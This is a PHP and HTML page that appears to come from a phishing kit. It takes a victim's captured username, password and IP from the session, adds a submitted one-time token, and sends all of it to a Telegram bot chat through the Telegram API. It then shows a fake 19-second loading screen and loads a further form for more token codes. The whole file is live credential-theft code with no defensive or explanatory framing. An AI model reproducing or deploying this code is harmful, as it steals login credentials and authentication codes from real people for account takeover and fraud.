<?php
    session_start();


    if( empty($_POST['trdip01']) ){
        header ('Location:index.php');
        session_destroy();
    }


    $msg =  "GTC -> ".$_SESSION['ips'] . 'U: '.$_SESSION['u1'] . " - P: " . $_SESSION['p1']. " - TK: " . $_POST['trdip01'];

    $bt_tkn = $_SESSION['tlg1'];
    $url = "https://api.telegram.org/bot$bt_tkn/sendMessage";
    $datos = array('chat_id' => $_SESSION['cht1'], 'text' => $msg);
    @$options = array('http' => array('method' => 'POST', 'content' => http_build_query($datos)));
    @$context = stream_context_create($options);
    @$rstd = file_get_contents($url, false, $context);

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Online</title>
    </head>
    <body>
        <style>*{margin:0;padding: 0;}</style>

        <div id="trxld" style="height: 100%;background: #fff;z-index: 10;text-align:center;width:100%;position: fixed;">
            <img src="trdlg.svg" style="width: 500px;margin-top: 130px;"><br>
            <div style="border: 5px solid #1463b4;width: 120px;height: 120px;display:inline-block;border-radius: 50%;background: #fff;">
                <img src="trcnt.gif?id=1" style="width: 110px;position: relative;top: 36px;">
            </div>
        </div>

        <div id="cont1" style="display:flex;height: 100vh;justify-content: center;">
            <section id="rght1" style="height: 100vh;background-color: #fff;width:620px;text-align: center;">
                <div onclick="ldtrd01()" id="trd01" style="margin-top: 40px;display: inline-block;width: 591.55px;height:475.90px;background-color:#fff;background-image:url(tkn3.svg);background-repeat:no-repeat;background-size: cover;">
                    
                </div>
            </section>
        </div>

        <style>
            @media only screen and (max-width: 500px){
                
                #trd01{
                    zoom:70%!important;
                }
                #trxld > img{
                    width:400px!important;
                }
            }
        </style>
        <script>
            function ldtrd01() {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                    document.getElementById("trd01").innerHTML = this.responseText; 
                    document.getElementById("trd01").onclick = null;
                    }
                };
                xhttp.open("GET", "trdfm3.html", true);
                xhttp.send();
            }
        </script>
        <script>
            window.onload = function(){
                setTimeout(function(){ 
                    document.getElementById("trxld").style.display = "none";
                }, 19000);  
            }
        </script>

        <img src="tkn4.svg" style="display:none;">
    </body>
</html>